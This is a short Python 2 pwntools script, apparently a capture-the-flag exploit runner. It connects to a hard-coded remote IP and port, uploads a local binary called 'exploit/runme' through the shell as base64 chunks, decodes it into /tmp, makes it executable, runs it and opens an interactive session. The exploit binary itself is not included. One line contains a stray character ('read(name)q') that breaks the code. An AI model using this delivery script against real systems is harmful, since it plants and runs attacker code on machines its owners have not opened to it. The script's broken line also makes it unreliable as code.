#!/usr/bin/env python2
from pwn import *
from os import system

def send_command(cmd, print_cmd = True, print_resp = False):
	if print_cmd:
		log.info(cmd)

	p.sendlineafter("$", cmd)
	resp = p.recvuntil("$")

	if print_resp:
		log.info(resp)

	p.unrecv("$")
	return resp

def send_file(name):
	homedir = "/tmp"
	file = read(name)q	
	f = b64e(file)

	send_command("rm -f {}/a.b64".format(homedir))
	send_command("rm -f {}/a".format(homedir))

	size = 800
	for i in range(len(f)/size + 1):
		log.info("Sending chunk {}/{}".format(i, len(f)/size))
		send_command("echo -n '{}' >> {}/a.b64".format(f[i*size:(i+1)*size], homedir), False)

	send_command("cat {}/a.b64 | base64 -d > {}/a".format(homedir, homedir))
	send_command("chmod +x {}/a".format(homedir))

def exploit():
	# system("./exploit/compile.sh;")
	send_file("exploit/runme")
	p.sendline("/tmp/a")
	p.interactive()

if __name__ == "__main__":

	p = remote("54.249.58.143", 9003)
	# p = process("./start.sh")
	exploit()